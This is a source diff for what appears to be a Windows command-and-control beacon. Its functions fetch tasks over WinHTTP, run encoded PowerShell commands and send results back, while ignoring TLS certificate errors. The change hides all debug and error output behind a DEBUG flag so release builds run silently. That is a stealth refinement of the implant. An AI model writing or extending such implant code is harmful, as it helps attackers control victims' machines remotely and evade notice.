@@ -25,8 +25,9 @@ static wstring beaconName = L"";
 
 bool runTask(string outBuffer, DWORD dwSize)
 {
+#ifdef DEBUG
     printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
-
+#endif
     // find the 2 pipe positions to parse the full task
     // taskIndex|command|data
 
@@ -58,8 +59,10 @@ bool runTask(string outBuffer, DWORD dwSize)
         }
         catch (const exception &e)
         {
+#ifdef DEBUG
             cout
                 << "Error: " << e.what() << "\n";
+#endif
         }
 
         currentSleep = seconds * 100000 ? seconds : currentSleep;
@@ -106,7 +109,9 @@ string runEncodedPSCommand(string command)
 
 bool fetchWinHTTPError(const char *msg)
 {
+#ifdef DEBUG
     cout << msg << " failed: " << GetLastError() << "\n";
+#endif
     return false;
 }
 
@@ -143,7 +148,9 @@ bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
         return fetchWinHTTPError("WinHttpOpenRequest");
     }
 
+#ifdef DEBUG
     cout << "Request Sent" << endl;
+#endif
 
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
@@ -280,9 +287,9 @@ bool sendResults(const string &result, bool asStream)
     {
         return fetchWinHTTPError("WinHttpOpenRequest");
     }
-
+#ifdef DEBUG
     cout << "Request Sent" << endl;
-
+#endif
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
